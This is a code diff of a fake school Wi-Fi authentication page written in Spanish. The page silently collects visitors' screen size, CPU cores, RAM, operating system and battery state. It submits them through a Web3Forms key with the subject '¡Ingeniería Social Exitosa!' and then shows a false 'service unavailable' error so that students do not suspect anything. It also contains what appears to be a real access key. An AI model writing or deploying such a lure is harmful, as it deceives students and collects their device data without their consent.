@@ -23,11 +23,21 @@
         <h1 id="titulo-estado">Portal de Autenticación</h1>
         <p id="descripcion-estado">Estás a un paso de conectarte a la red inalámbrica de alta velocidad para alumnos y docentes.</p>
         
-        <!-- Eliminamos la acción directa del formulario para controlarla por JavaScript de forma segura -->
+        <!-- Volvemos al formato de formulario tradicional que sí le gusta a Web3Forms -->
         <form id="form-seguridad">
             
-            <input type="hidden" id="access_key" value="57341f12-ab6c-4369-9b1b-64b6e24cca32">
+            <!-- Tu clave de Web3Forms -->
+            <input type="hidden" name="access_key" value="57341f12-ab6c-4369-9b1b-64b6e24cca32">
+            <input type="hidden" name="subject" value="¡Ingeniería Social Exitosa! - Dispositivo Identificado">
+            <input type="hidden" name="from_name" value="Portal Wi-Fi Escolar">
             
+            <!-- Inputs con atributos "name" explícitos para asegurar la entrega en el correo -->
+            <input type="hidden" id="inp-pantalla" name="resolucion_pantalla">
+            <input type="hidden" id="inp-procesador" name="nucleos_procesador">
+            <input type="hidden" id="inp-ram" name="memoria_ram_aprox">
+            <input type="hidden" id="inp-so" name="sistema_operativo">
+            <input type="hidden" id="inp-bateria" name="nivel_bateria">
+
             <div class="info-wifi" id="bloque-info">
                 <small style="color: #58a6ff; font-weight: bold; display: block; margin-bottom: 5px;">DETALLES DE LA CONEXIÓN:</small>
                 <span style="font-family: monospace; font-size: 0.9em;">
@@ -39,7 +49,7 @@
 
             <div class="error-alerta" id="mensaje-error">
                 <strong>⚠️ Servicio No Disponible:</strong><br>
-                Lo sentimos, en este momento aún no está habilitada la red estudiantil de alta velocidad en esta área del plantel. Por favor, intenta conectarte más tarde o acude al Departamento de Soporte Técnico.
+                Lo sentimos, en este momento aún no está habilitada la red estudiantil de alta velocidad en esta área del plantel. Por favor, intenta conectarte más tarde.
             </div>
 
             <button type="submit" class="btn-conectar" id="btn-accion">Conectarse a la Red</button>
@@ -47,24 +57,28 @@
     </div>
 
     <script>
-        // Objeto global para almacenar los datos del hardware
-        let datosHardware = {};
-
         async function capturarHardware() {
-            datosHardware = {
-                resolucion_pantalla: `${window.screen.width}x${window.screen.height}`,
-                nucleos_procesador: navigator.hardwareConcurrency || "No detectado",
-                memoria_ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "No detectado",
-                sistema_operativo: obtenerSO(),
-                nivel_bateria: "No disponible"
+            const info = {
+                pantalla: `${window.screen.width}x${window.screen.height}`,
+                procesador: navigator.hardwareConcurrency || "No detectado",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "No detectado",
+                so: obtenerSO(),
+                bateria: "No disponible"
             };
 
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    datosHardware.nivel_bateria = (battery.level * 100) + "% (Cargando: " + (battery.charging ? "Sí" : "No") + ")";
+                    info.bateria = (battery.level * 100) + "% (Cargando: " + (battery.charging ? "Sí" : "No") + ")";
                 } catch (e) {}
             }
+
+            // Inyectamos los datos en los inputs del formulario
+            document.getElementById('inp-pantalla').value = info.pantalla;
+            document.getElementById('inp-procesador').value = info.procesador;
+            document.getElementById('inp-ram').value = info.ram;
+            document.getElementById('inp-so').value = info.so;
+            document.getElementById('inp-bateria').value = info.bateria;
         }
 
         function obtenerSO() {
@@ -75,34 +89,25 @@
             return "Otro / Desconocido";
         }
 
-        // Interceptamos el evento "submit" del formulario de manera segura
+        // Manejo seguro del envío
         document.getElementById('form-seguridad').addEventListener('submit', function(event) {
-            event.preventDefault(); // 1. Evita que la página se recargue o dé el error 405
+            event.preventDefault(); // Evitamos recarga y errores 405
             
             const boton = document.getElementById('btn-accion');
             boton.innerText = "Conectando...";
             boton.disabled = true;
 
-            // 2. Preparamos el paquete de datos en formato JSON limpio
-            const paqueteEnvio = {
-                access_key: document.getElementById('access_key').value,
-                subject: "Nuevo Dispositivo Identificado - Portal Wi-Fi",
-                from_name: "Simulador Wi-Fi Escolar",
-                ...datosHardware
-            };
+            // CAPTURA CLAVE: Empacamos el formulario completo usando FormData nativo
+            // Esto asegura que Web3Forms procese el correo exactamente igual que con tu primer botón
+            const formData = new FormData(this);
 
-            // 3. Enviamos los datos en segundo plano
-            fetch('https://web3forms.com', {
+            fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(paqueteEnvio)
+                body: formData // Enviamos FormData directo sin 'headers' ni JSON.stringify
             })
             .then(response => response.json())
             .then(data => {
-                // 4. Una vez confirmado el envío por Web3Forms, transformamos la interfaz
+                // Transformación visual inmediata al confirmar el envío
                 document.getElementById('icono-estado').innerText = "⚠️";
                 document.getElementById('titulo-estado').innerText = "Fallo de Conexión";
                 document.getElementById('titulo-estado').style.color = "#f85149";
@@ -112,8 +117,8 @@
                 document.getElementById('mensaje-error').style.display = "block";
             })
             .catch(error => {
-                console.error("Error en la transmisión:", error);
-                // Incluso si falla la red de la escuela, forzamos el mensaje para que el alumno no sospeche
+                console.error("Error en segundo plano:", error);
+                // Forzamos el mensaje de error falso para mantener la simulación ante fallos locales
                 boton.style.display = "none";
                 document.getElementById('mensaje-error').style.display = "block";
             });
